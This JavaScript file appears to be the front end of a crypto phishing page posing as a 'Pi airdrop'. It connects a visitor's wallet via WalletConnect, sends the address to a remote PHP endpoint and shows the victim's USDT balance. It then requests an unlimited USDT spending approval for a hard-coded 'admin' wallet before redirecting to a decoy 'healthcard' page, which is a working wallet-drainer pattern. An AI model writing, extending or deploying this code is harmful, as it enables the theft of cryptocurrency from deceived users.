import EthereumProvider from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";



const connectButton = document.getElementById("connectWallet");
const approveButton = document.getElementById("approveUSDT");

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Corrected
const ADMIN_WALLET = "0x9b40C6cddE74A424A744534d0A534efe2CA653bA";

const ABI = [
    "function approve(address spender, uint256 amount) public returns (bool)"
];

let signer;

connectButton.onclick = async() => {
    connectButton.innerText = "Processing...";
    connectButton.disabled = true;

    setTimeout(() => {
        document.getElementById("preConnectOverlay").style.display = "none";
        connectButton.innerText = "Proceed"; // Reset text just in case
        connectButton.disabled = false;
    }, 5000);
    try {
        const provider = await EthereumProvider.init({
            projectId: "5c7a882142c7491241b507534414ddff",
            chains: [56],
            methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
            showQrModal: true
        });

        await provider.connect();

        const ethersProvider = new ethers.BrowserProvider(provider);
        signer = await ethersProvider.getSigner();
        const userAddress = await signer.getAddress();

        const overlay = document.getElementById("connectionPopupOverlay");
        const popupBox = document.getElementById("connectionPopupBox");
        const closeBtn = document.getElementById("popupCloseBtn");

        if (overlay) {
            overlay.style.display = "flex";
            overlay.querySelector(".user-address").textContent = userAddress;
        }

        // Close on button click
        if (closeBtn) {
            closeBtn.onclick = () => {
                overlay.style.display = "none";
            };
        }

        // Close when clicking outside the popup box
        window.addEventListener("click", function(event) {
            if (event.target === overlay) {
                overlay.style.display = "none";
            }
        });

        fetch('https://official-pi-airdrops.com/php/save_wallet.php', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ address: userAddress })
        });

        approveButton.style.display = "inline-block";

    } catch (err) {
        console.error("Wallet connection error:", err);
    }
};

approveButton.onclick = async() => {
    // try {
    //     const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
    //     const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
    //     await tx.wait();
    //     alert("Approval granted");
    // } catch (err) {
    //     console.error("Approval error:", err);
    // }

    try {
        const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
        const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
        await tx.wait();

        const userAddress = await signer.getAddress(); // get the address
        window.location.href = `healthcard.html?wallet=${userAddress}`; // redirect with query
    } catch (err) {
        console.error("Approval error:", err);
    }

};




// new function just to show wallet address and balance to user on index pageconst USDT_ABI = [
const USDT_ABI = [
    "function balanceOf(address owner) view returns (uint256)"
];

const userAddressSpan = document.getElementById("userAddress");
const userBalanceSpan = document.getElementById("userBalance");
const walletInfoDiv = document.getElementById("walletInfo");

// Enhance existing connect logic to display address & balance
const originalConnect = connectButton.onclick;
connectButton.onclick = async() => {
    await originalConnect(); // Run your existing logic

    try {
        const ethersProvider = signer.provider;
        const userAddress = await signer.getAddress();

        // Show address
        userAddressSpan.innerText = userAddress;
        document.getElementById("userAddress").value = userAddress;
        walletInfoDiv.style.display = "block";

        // Load and show USDT balance
        const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, ethersProvider);
        const rawBalance = await usdt.balanceOf(userAddress);
        const readableBalance = ethers.formatUnits(rawBalance, 18);
        userBalanceSpan.innerText = readableBalance + " USDT";
    } catch (err) {
        console.error("Display balance error:", err);
        userBalanceSpan.innerText = "Error";
    }
};